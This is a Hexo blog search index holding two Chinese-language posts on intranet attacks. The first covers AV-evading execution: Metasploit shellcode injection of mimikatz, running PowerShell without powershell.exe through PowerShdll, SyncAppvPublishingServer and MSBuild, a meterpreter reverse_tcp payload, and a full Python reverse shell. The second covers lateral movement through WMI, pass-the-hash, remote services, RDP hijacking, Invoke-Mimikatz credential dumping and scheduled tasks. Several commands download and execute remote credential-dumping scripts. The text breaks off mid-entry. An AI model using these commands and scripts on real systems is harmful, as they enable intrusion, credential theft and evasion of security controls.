<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>奇技淫巧</title>
    <link href="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    <url>/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>介绍一些在内网中罕见的攻击方式</p><a id="more"></a><h2 id="1-交互式内存加载"><a href="#1-交互式内存加载" class="headerlink" title="1.交互式内存加载"></a>1.交互式内存加载</h2><h3 id="Msf-donut交互式执行内存"><a href="#Msf-donut交互式执行内存" class="headerlink" title="Msf+donut交互式执行内存"></a>Msf+donut交互式执行内存</h3><p>msf得到一个会话</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204185453881.png" alt="image-20210204185453881"></p><p>生成一个bin文件</p><pre><code class="hljs awk">.<span class="hljs-regexp">/donut -f /</span>root<span class="hljs-regexp">/webtools/</span>BypassAntiVirus<span class="hljs-regexp">/mimikatz/mimi</span>katz_trunk_2.<span class="hljs-number">2.0</span><span class="hljs-regexp">/x64/mimi</span>katz.exe  -a <span class="hljs-number">2</span> -o <span class="hljs-regexp">/tmp/</span>payload.bin<span class="hljs-comment">#-f：指定文件位置</span><span class="hljs-comment">#－a：是指定位数，2-64位，1-32位</span><span class="hljs-comment">#－o：是指定输出</span></code></pre><p>再使用刚刚生成的bin文件</p><pre><code class="hljs awk">msf5 exploit(multi<span class="hljs-regexp">/handler) &gt; use post/</span>windows<span class="hljs-regexp">/manage/</span>shellcode_inject msf5 post(windows<span class="hljs-regexp">/manage/</span>shellcode_inject) &gt; set shellcode <span class="hljs-regexp">/tmp/</span>payloads.binshellcode =&gt; <span class="hljs-regexp">/tmp/</span>payloads.binmsf5 post(windows<span class="hljs-regexp">/manage/</span>shellcode_inject) &gt; set session <span class="hljs-number">1</span>session =&gt; <span class="hljs-number">1</span>msf5 post(windows<span class="hljs-regexp">/manage/</span>shellcode_inject) &gt; run</code></pre><p>但是出错</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204185823677.png" alt="image-20210204185823677"></p><p>因为我们生成木马是32位，机器是64位，使用将进程迁移到64的进程即可。</p><p>执行会得到一个交互式的mimikatz环境</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204190010171.png" alt="image-20210204190010171"></p><p>这种方法在x86的机器上比较方便。</p><h3 id="2-无power-shell运行power-shell"><a href="#2-无power-shell运行power-shell" class="headerlink" title="2.无power shell运行power shell"></a>2.无power shell运行power shell</h3><h4 id="1-powerline"><a href="#1-powerline" class="headerlink" title="1.powerline"></a>1.powerline</h4><p>PowerLine是一款由c#编写的工具，支持本地命令行调用和远程调用，可以在不直接调用PowerShell的情况下调用PowerShell脚本.</p><p>优点：1.自动识别win7、win10系统  2.使用方便,无需复杂的ide  3.自动xor编码</p><p>下载地址： <a href="https://github.com/fullmetalcache/PowerLine">https://github.com/fullmetalcache/PowerLine</a></p><p>首先将其项目放置目标机器，执行其bat文件（cmd下也可）</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204191318286.png" alt="image-20210204191318286"></p><p>然后在UserConf.xml文件中填写你所需要调用的powershell脚本的地址，默认自带powerup、powerview、Mimikatz等，只要按照他给定的格式加入你的ps脚本地址即可</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204191638597.png" alt="image-20210204191638597"></p><p>加入完成以后，运行PLBuilder.exe进行构建，构建过程中，被360杀了。。</p><p> <img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204191707416.png" alt="image-20210204191707416"></p><p>一般AV只是检测PS发出的恶意请求，但由于在powerline中，请求是由powerline发出的，便绕过了一部分AV，但是缺点也是很明显，就是可扩展性太差，所有的功能依赖于配置文件…</p><h4 id="2-powershdll"><a href="#2-powershdll" class="headerlink" title="2.powershdll"></a>2.powershdll</h4><p>这个工具主要使用dll去运行powershell而不需要去连接powershell.exe,所以具有一定的bypassAV能力，当然它也可以在这几个程序下运行rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe或者运行作者给的exe</p><p>下载地址： <a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a></p><p>1.exe用法</p><p>进入交互模式：<code>powershdll.exe -i</code>,获得了一个交互式的PS环境，可执行任意的powershell命令</p><p>在交互式模式下唯一要注意的就是，你输入的内容不能过长，否则会出现问题</p><p>2.dll用法</p><p>cmd下运行</p><pre><code class="hljs awk">rundll32 PowerShdll.dll,main . &#123; iwr -useb https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/peewpw/</span>Invoke-WCMDump<span class="hljs-regexp">/master/</span>Invoke-WCMDump.ps1 &#125; ^| iex;</code></pre><p>被杀。。。</p><h4 id="3-Nopowershell"><a href="#3-Nopowershell" class="headerlink" title="3.Nopowershell"></a>3.Nopowershell</h4><p>NoPowerShell是用C＃实现的工具，它支持执行类似PowerShell的命令，同时对任何PowerShell日志记录机制都不可见。同时也提供了CS下的cna脚本。</p><p>优点：执行隐秘、功能强大、扩展简单</p><p>即使不熟悉PS命令也可以使用cmd命令来代替PS命令，例如(使用ping来代替Test-NetConnection)</p><p>下载地址：<a href="https://github.com/bitsadmin/nopowershell.git">https://github.com/bitsadmin/nopowershell.git</a></p><p>直接运行便会输出它的版本和支持的命令</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204192140180.png" alt="image-20210204192140180"></p><p>过程360无拦截</p><p>dll版会被秒杀</p><p>cs下稳定</p><h4 id="4-SyncAppvPublishingServer"><a href="#4-SyncAppvPublishingServer" class="headerlink" title="4.SyncAppvPublishingServer"></a>4.SyncAppvPublishingServer</h4><p>SyncAppvPublishingServer是win10自带的服务，有vbs和exe两个版本 默认存放在<code>C:\Windows\System32</code>下面</p><p>弹出计算器：C:\Windows\System32\SyncAppvPublishingServer.vbs “Break; Start-Process Calc.exe ”</p><p> <img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204192246804.png" alt="image-20210204192246804"></p><p>或者</p><pre><code class="hljs latex">C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">SyncAppvPublishingServer</span></span>.vbs &quot;Break; iwr http://192.168.1.149:443&quot;</code></pre><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204192445392.png" alt="image-20210204192445392"></p><p>也可以去远程下载执行一些ps脚本就像下面这样：</p><pre><code class="hljs livescript">SyncAppvPublishingServer.exe <span class="hljs-string">\&quot;</span> Break; (New-<span class="hljs-built_in">Object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1&#x27;</span>,<span class="hljs-string">&#x27;$env:USERPROFILE/1.ps1&#x27;</span>); Start-Process <span class="hljs-string">&#x27;$env:USERPROFILE/1.ps1&#x27;</span> -WindowStyle Minimized;<span class="hljs-string">&quot;</span><span class="hljs-string"></span><span class="hljs-string">SyncAppvPublishingServer.exe &quot;</span>n;(New-<span class="hljs-built_in">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1&#x27;</span>) | IEX<span class="hljs-string">&quot;</span></code></pre><h4 id="5-调用Msbuild-exe"><a href="#5-调用Msbuild-exe" class="headerlink" title="5.调用Msbuild.exe"></a>5.调用Msbuild.exe</h4><p>MSBuild是Microsoft .NET框架的一部分，是受信任的Windows二进制文件，可用于在未安装Visual Studio的环境中构建应用程序。从安全的角度来看，应将此二进制文件从系统中删除或由应用程序白名单解决方案阻止，以防止执行存储在具有以下扩展名的文件中的任意代码</p><p>MSBuild是.Net框架中包含的工具，用于自动化创建软件产品的过程，包括编译源代码，打包，测试，部署和创建文档。</p><p>该二进制文件执行本地存储在系统上的代码的能力可能导致逃避现有的安全控件（组策略，应用程序白名单等），从而阻止PowerShell或其他依赖PowerShell的类似工具。但是，不再需要MSBuild执行代码，因为可以使用.NET程序集，该程序集将从远程位置（UNC路径）调用恶意的.csproj。该技术不会留下任何痕迹，因为它不会接触磁盘，并且代码已注入到合法的Windows进程Internet Explorer中。</p><p>Msbuild依赖于.csproj文件，该文件具有XML语法，包含了.NET构建过程中的结果，类似于unix中的make，代码如下：</p><pre><code class="hljs pgsql">&lt;Project ToolsVersion=&quot;4.0&quot;xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;&lt;Target <span class="hljs-type">Name</span>=&quot;MSPSLess&quot;&gt;&lt;/Target&gt;&lt;PSLess/&gt;&lt;UsingTask TaskName=&quot;PSLess&quot; TaskFactory=&quot;CodeTaskFactory&quot;AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;&lt;Task&gt;&lt;Code <span class="hljs-keyword">Type</span>=&quot;Class&quot; Lang=&quot;cs&quot;&gt;&lt;![CDATA[<span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.Collections.ObjectModel;<span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.Management.Automation;<span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.Management.Automation.Runspaces;<span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.Runtime.InteropServices;<span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.IO;<span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>;<span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.Text;<span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.Runtime.InteropServices;<span class="hljs-keyword">using</span> Microsoft.Build.Framework;<span class="hljs-keyword">using</span> Microsoft.Build.Utilities;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> PSLess :  Task&#123;  <span class="hljs-built_in">public</span> override <span class="hljs-type">bool</span> <span class="hljs-keyword">Execute</span>()  &#123;   string buffer = &quot;&quot;;   try   &#123;     buffer = File.ReadAllText(&quot;c:/test/test.ps1&quot;);   &#125;   catch (<span class="hljs-keyword">Exception</span> e)   &#123;    Console.WriteLine(&quot;error:&quot; +e.Message);    Environment.<span class="hljs-keyword">Exit</span>(<span class="hljs-number">2</span>);   &#125;   buffer=RunScript(buffer);   Console.WriteLine(buffer);   <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>; &#125; private static string RunScript(string script)  &#123;    Runspace MyRunspace = RunspaceFactory.CreateRunspace();    MyRunspace.<span class="hljs-keyword">Open</span>();    Pipeline MyPipeline = MyRunspace.CreatePipeline();    MyPipeline.Commands.AddScript(script);    MyPipeline.Commands.<span class="hljs-keyword">Add</span>(&quot;Out-String&quot;);    Collection&lt;PSObject&gt; outputs = MyPipeline.Invoke();    MyRunspace.<span class="hljs-keyword">Close</span>();    StringBuilder sb = <span class="hljs-built_in">new</span> StringBuilder();    <span class="hljs-keyword">foreach</span> (PSObject pobject <span class="hljs-keyword">in</span> outputs)    &#123;      sb.AppendLine(pobject.ToString());    &#125;    <span class="hljs-keyword">return</span> sb.ToString();   &#125;&#125; ]]&gt;&lt; / Code&gt;&lt;/Task&gt;&lt;/UsingTask&gt;&lt;/Project&gt;</code></pre><p>test.ps1的内容如下：</p><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello from powershell-less&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;this is your pid:<span class="hljs-variable">$PID</span>&quot;</span><span class="hljs-variable">$psversiontable</span></code></pre><p>执行test.ps1，效果：</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204204820918.png" alt="image-20210204204820918"></p><p>github上类似的项目：<a href="https://github.com/Cn33liz/MSBuildShell.git%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%AE%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E4%B8%80%E4%B8%AA%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%9A%84ps">https://github.com/Cn33liz/MSBuildShell.git，执行完可以获得一个交互式的ps</a></p><h2 id="3-msbuild-without-msbuild"><a href="#3-msbuild-without-msbuild" class="headerlink" title="3.msbuild_without_msbuild"></a>3.msbuild_without_msbuild</h2><p>不使用msbuild调用msbuild来构建程序的方法。</p><p>生成一个msf的payload并编码</p><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp -f<span class="hljs-built_in"> raw </span>-o payload64.bin <span class="hljs-attribute">LHOST</span>=10.0.0.1 <span class="hljs-attribute">LPORT</span>=2000 base64 -i /root/payload64.bin &gt; payload64.txt</code></pre><p>然后使用下面的方法得到一个dll文件</p><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Windows\Microsoft.Net\Framework\v<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">30319</span>\csc.exe /reference:<span class="hljs-string">&quot;Microsoft.Build.Framework.dll&quot;</span>;<span class="hljs-string">&quot;Microsoft.Build.Tasks.v4.0.dll&quot;</span>;<span class="hljs-string">&quot;Microsoft.Build.Utilities.v4.0.dll&quot;</span> /target:library IEShim.cs</code></pre><p>得到dll后将msbuildapicaller.cs 的第60行替换成你smb服务器的程序地址..</p><p>smb服务器可以使用impacket开启</p><pre><code class="hljs arcade">impacket-smbserver share <span class="hljs-string">`pwd`</span></code></pre><p>替换msbuildapicaller.csproj中的shellcode与dll地址</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204211852420.png" alt="image-20210204211852420"></p><p>然后编译</p><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Windows\Microsoft.Net\Framework\v<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">30319</span>\csc.exe /reference:<span class="hljs-string">&quot;Microsoft.Build.Framework.dll&quot;</span>;<span class="hljs-string">&quot;Microsoft.Build.dll&quot;</span>;<span class="hljs-string">&quot;Microsoft.Build.Engine.dll&quot;</span>;<span class="hljs-string">&quot;Microsoft.Build.Utilities.v4.0.dll&quot;</span>;<span class="hljs-string">&quot;System.Runtime.dll&quot;</span> /target:exe msbuildapicaller.cs</code></pre><p>得到exe文，件，可以使用Assembly MSBuildApiCaller.exe去执行</p><h2 id="4-自写shell"><a href="#4-自写shell" class="headerlink" title="4.自写shell"></a>4.自写shell</h2><p>编写反弹shell的原理</p><p><img src="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20210204212921171.png" alt="image-20210204212921171"></p><p>简单的客户端，服务端</p><pre><code class="hljs livecodeserver">import <span class="hljs-built_in">socket</span>phone = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)phone.bind((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">2333</span>))phone.listen()phone.accept()</code></pre><pre><code class="hljs livecodeserver">import <span class="hljs-built_in">socket</span>phone = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)phone.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">2333</span>))</code></pre><p>一些常用的实现通信的函数</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">recv</span><span class="hljs-params">()</span></span> #接受TCP数据<span class="hljs-function"><span class="hljs-title">send</span><span class="hljs-params">()</span></span> #发送TCP数据<span class="hljs-function"><span class="hljs-title">recvfrom</span><span class="hljs-params">()</span></span> #接受UDP数据<span class="hljs-function"><span class="hljs-title">sendto</span><span class="hljs-params">()</span></span> #发送UDP数据<span class="hljs-function"><span class="hljs-title">getpeername</span><span class="hljs-params">()</span></span> #接收到当前套接字远端的地址<span class="hljs-function"><span class="hljs-title">getsockname</span><span class="hljs-params">()</span></span> #返回指定套接字的参数<span class="hljs-function"><span class="hljs-title">setsockopt</span><span class="hljs-params">()</span></span> #设置指定套接字的参数<span class="hljs-function"><span class="hljs-title">close</span><span class="hljs-params">()</span></span> #关闭套接字</code></pre><p>需要一个能够实现执行命令并返回会话的模块：subprocess</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<span class="hljs-comment">#Popen方法是用来执行系统命令的，直接把结果打印到终端了</span>res =subprocess.Popen(<span class="hljs-string">r&#x27;dir&#x27;</span>,shell=<span class="hljs-literal">True</span>,                       <span class="hljs-comment">#r&#x27;dsfsdfr&#x27;,shell=True,</span>                      <span class="hljs-comment"># stdin= #标准输入（不常用）</span>                       stdout=subprocess.PIPE,<span class="hljs-comment">#stdout 标准输出</span>                       stderr=subprocess.PIPE) <span class="hljs-comment">#stderr 标准错误</span>print(res.stdout.read().decode(<span class="hljs-string">&#x27;gbk&#x27;</span>))</code></pre><p>简单的例子</p><pre><code class="hljs livecodeserver">import <span class="hljs-built_in">socket</span>import subprocessimport sysdef reve_shell(host,port):    host = <span class="hljs-built_in">socket</span>.gethostbyname(host)    <span class="hljs-built_in">shell</span> = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)    <span class="hljs-built_in">shell</span>.connect((host,port))    <span class="hljs-keyword">while</span> True:        cmd = <span class="hljs-built_in">shell</span>.recv(<span class="hljs-number">1024</span>)        res = subprocess.Popen(cmd.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),                               <span class="hljs-built_in">shell</span>=True,                               <span class="hljs-keyword">stdout</span>=subprocess.PIPE,                               <span class="hljs-keyword">stderr</span>=subprocess.PIPE)        <span class="hljs-keyword">stdout</span> = res.<span class="hljs-keyword">stdout</span>.<span class="hljs-built_in">read</span>()        <span class="hljs-keyword">stderr</span> = res.<span class="hljs-keyword">stderr</span>.<span class="hljs-built_in">read</span>()        <span class="hljs-built_in">shell</span>.<span class="hljs-built_in">send</span>(<span class="hljs-keyword">stdout</span>+<span class="hljs-keyword">stderr</span>)    <span class="hljs-built_in">shell</span>.<span class="hljs-built_in">close</span>()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    host = sys.argv[<span class="hljs-number">1</span>]    port = int(sys.argv[<span class="hljs-number">2</span>])    reve_shell(host=host,port=port)</code></pre><p>可以直接执行，也可以打包为exe执行：<code>pyinstaller -F myfile.py</code></p><p>文章参考：</p><p><a href="https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html">https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</a></p><p><a href="https://lengjibo.github.io/psbypass/">https://lengjibo.github.io/psbypass/</a></p><p><a href="https://lengjibo.github.io/msbuild/">https://lengjibo.github.io/msbuild/</a></p><p><a href="https://pentestlaboratories.com/2020/01/27/msbuild-without-msbuild/">https://pentestlaboratories.com/2020/01/27/msbuild-without-msbuild/</a></p><p><a href="https://www.sec-in.com/article/178">https://www.sec-in.com/article/178</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Msf+donut交互式执行内存</tag>
      
      <tag>无powershell运行powershell五种方式</tag>
      
      <tag>msbuild_without_msbuild</tag>
      
      <tag>自写shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>横向移动</title>
    <link href="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<p>在攻击者获取到某台内网机器的控制权限以及拿到其他机器的账户密码之后，进一步会考虑如何在内网进行横向移动，以及攻击域控服务器，本文总结了突破边界后进一步的攻击技巧。</p><a id="more"></a><h2 id="1-WMI"><a href="#1-WMI" class="headerlink" title="1.WMI"></a>1.WMI</h2><p>WMI全称”windows管理规范”，从win2003开始一直存在。</p><p><strong>利用条件</strong></p><p>1、WMI服务开启，端口135，默认开启。</p><p>2、防火墙允许135、445等端口通信。</p><p>3、管理员权限，以及本地管理员组..</p><p>关于域用户添加进本地管理组的方法，可以参考 <a href="https://richardstk.com/2013/11/26/adding-domain-users-to-the-local-administrators-group-using-group-policy/">https://richardstk.com/2013/11/26/adding-domain-users-to-the-local-administrators-group-using-group-policy/</a></p><p><strong>利用方法</strong></p><h3 id="1-windows自带wmic工具横向移动"><a href="#1-windows自带wmic工具横向移动" class="headerlink" title="1.windows自带wmic工具横向移动"></a>1.windows自带wmic工具横向移动</h3><p>先使用cs生成powershell上线载荷</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204130530497.png" alt="image-20210204130530497"><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204130606900.png" alt="image-20210204130606900"></p><p>cmd执行：</p><pre><code class="hljs crmsh">wmic /<span class="hljs-keyword">NODE</span><span class="hljs-title">:目标ip</span> /user:<span class="hljs-string">&quot;域\主机名&quot;</span> /password:<span class="hljs-string">&quot;密码&quot;</span> PROCESS call create <span class="hljs-string">&quot;webshell&quot;</span><span class="hljs-comment">#注意wenshell的payload闭合时产生的双引号需要转义</span></code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204125808036.png" alt="image-20210204125808036"></p><p>cs成功上线。</p><h3 id="2-wmiexec-vbs"><a href="#2-wmiexec-vbs" class="headerlink" title="2.wmiexec.vbs"></a>2.wmiexec.vbs</h3><p>域环境下或者在工作组环境下都可以正常使用，使用域账号或者本地账户均可</p><p>工作组</p><pre><code class="hljs stylus">cscript wmiexec<span class="hljs-selector-class">.vbs</span> /shell <span class="hljs-number">192.168</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> administrator Aatest</code></pre><p>域环境</p><pre><code class="hljs dockerfile">cscript wmiexec.vbs /<span class="hljs-keyword">shell</span><span class="bash"> 目标ip 域名\用户 密码</span></code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204131550106.png" alt="image-20210204131550106"></p><p>即得到目标的cmd</p><h3 id="3-Invoke-TheHash-ps1"><a href="#3-Invoke-TheHash-ps1" class="headerlink" title="3.Invoke-TheHash.ps1"></a>3.Invoke-TheHash.ps1</h3><p>在目标主机上分别导入Invoke-TheHash.ps1和Invoke-WMIExec.ps1</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204131656073.png" alt="image-20210204131656073">!</p><p>批量撞网段内的机器即可：</p><pre><code class="hljs angelscript">Invoke-TheHash -Type WMIExec -Target <span class="hljs-number">192.168</span><span class="hljs-number">.93</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -Domain 域控名 -Username administrator -Hash 已知hash</code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204132053457.png" alt="image-20210204132053457"></p><p>成功的机器可以使用WMI连接</p><h3 id="4-pth工具集（kali自带）"><a href="#4-pth工具集（kali自带）" class="headerlink" title="4.pth工具集（kali自带）"></a>4.pth工具集（kali自带）</h3><p>执行以下命令可以得到目标cmd环境：</p><pre><code class="hljs awk">pth-winexe -U 账户名%<span class="hljs-string">&#x27;密码&#x27;</span> --system --ostype=<span class="hljs-number">1</span> <span class="hljs-regexp">//</span>目标ip cmd</code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204132324616.png" alt="image-20210204132324616"></p><h2 id="2-Remote-Service-Creation"><a href="#2-Remote-Service-Creation" class="headerlink" title="2.Remote Service Creation"></a>2.Remote Service Creation</h2><p>远程服务控制，可以通过smb安排任务，在客户机1上执行操作启动客户机2的服务，也就要求了客户机1对客户机2具有操作权限</p><p>先用cs生成一个服务类型的木马</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204133407667.png" alt="image-20210204133407667"></p><p>在客户机1上执行</p><pre><code class="hljs apache"><span class="hljs-attribute">sc</span> \\客户机<span class="hljs-number">2</span>-ip create ExampleService binpath=<span class="hljs-string">&quot;path\service.exe&quot;</span></code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204133613686.png" alt="image-20210204133613686"></p><p>成功创建了一个服务ExampleService，需要手动开启：</p><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> \\客户机<span class="hljs-number">2</span><span class="hljs-literal">-ip</span> <span class="hljs-built_in">start</span> ExampleService</code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204133824089.png" alt="image-20210204133824089"></p><p>此时cs会得到一个system的会话</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204133853885.png" alt="image-20210204133853885"></p><h2 id="3-Remote-Desktop-Protocol"><a href="#3-Remote-Desktop-Protocol" class="headerlink" title="3.Remote Desktop Protocol"></a>3.Remote Desktop Protocol</h2><p>远程桌面协议RDP。微软将其对远程桌面协议(rdp)的实现功能称为远程桌面服务(RDS)</p><h3 id="RDP-hijacking"><a href="#RDP-hijacking" class="headerlink" title="RDP hijacking"></a><strong>RDP hijacking</strong></h3><p>非常古老的方法。在system权限下，tscon.exe使用目标会话编号，就能够立即获取目标用户的桌面，不会留下痕迹</p><p><strong>利用</strong></p><p>假如在客户机1上查询会话时发现有客户机2登录此机器没有退出</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204134825571.png" alt="image-20210204134825571"></p><p>在客户机1执行：<code>JuicyPotato.exe -p &quot;tscon id&quot;</code></p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204134905353.png" alt="image-20210204134905353"></p><p>成功就可以直接远程登录到客户机2的机器上</p><p>但是客户机2会被踢出登录的客户机1</p><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204135218438.png" alt="image-20210204135218438"></p><h2 id="4-PowerShell-Remoting"><a href="#4-PowerShell-Remoting" class="headerlink" title="4.PowerShell Remoting"></a>4.PowerShell Remoting</h2><p>winRM服务，2012之后默认开启，也可以使用以下命令开启：<code>winrm quickconfig</code></p><p>执行以下命令连接到开启了服务的机器：</p><pre><code class="hljs cmake">Enter-PSSession -Computername <span class="hljs-keyword">TARGET</span></code></pre><p>或者远程获取机器的账号密码（利用条件：administrator或者winRM）：</p><p>在客户机2上导入mimikatz的ps1脚本<code>Import-Module .\mimikatz.ps1</code>，执行以下命令就可以获取客户机1的账户密码：</p><pre><code class="hljs angelscript">Invoke-Mimikatz -DumpCreds -ComputerName 客户机<span class="hljs-number">1</span>-NAME.域控名</code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204140032023.png" alt="image-20210204140032023"></p><h2 id="5-Task-Scheduler"><a href="#5-Task-Scheduler" class="headerlink" title="5.Task Scheduler"></a>5.Task Scheduler</h2><p>计划任务，winodws内置，administrators执行 ,2008之后不能使用交互式了</p><pre><code class="hljs applescript"><span class="hljs-keyword">at</span> <span class="hljs-built_in">time</span> /interactive cmd <span class="hljs-comment">#不再可以使用这样的了</span></code></pre><p>且at变为schtasks</p><p>本地创建任务：</p><pre><code class="hljs jboss-cli">SCHTASKS <span class="hljs-string">/Create</span> <span class="hljs-string">/SC</span> ONCE <span class="hljs-string">/TN</span> spawn <span class="hljs-string">/TR</span> task_<span class="hljs-keyword">command</span> <span class="hljs-string">/ST</span> time<span class="hljs-comment">#TN：任务名称</span><span class="hljs-comment">#TR：任务执行的程序</span><span class="hljs-comment">#ST：任务执行的时间</span></code></pre><p><img src="/2020/10/13/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20210204141155993.png" alt="image-20210204141155993"></p><p>本地删除任务（cmd下）：</p><pre><code class="hljs jboss-cli">SCHTASKS <span class="hljs-string">/Delete</span> <span class="hljs-string">/TN</span> spawn <span class="hljs-string">/F</span> &gt;nul 2&gt;&amp;1</code></pre><p>远程创建</p><pre><code class="hljs jboss-cli">SCHTASKS <span class="hljs-string">/Create</span> <span class="hljs-string">/S</span> target <span class="hljs-string">/RU</span> user_name <span class="hljs-string">/RP</span> user_password <span class="hljs-string">/TN</span> task_name <span class="hljs-string">/TR</span> task_<span class="hljs-keyword">command</span> <span class="hljs-string">/SC</span> daily <span class="hljs-string">/ST</span> time <span class="hljs-comment"># task_command 只能是一个文件，不能是什么命令，例如启动一个木马，可以直接计划任务执行m木马，也可以写一个bat启动，然后计划任务执行此bat</span></code></pre><p>powershell版本执行方法</p><pre><code class="hljs plain"></code></pre><p>若你当前拥有一台机器的administrator权限，但是得不到域内的任何东西，也即无法与DC通信，可以尝试提权到system之后，就能与DC正常通信了。</p><pre><code class="hljs plain"></code></pre><h2 id="6-PsExec"><a href="#6-PsExec" class="headerlink" 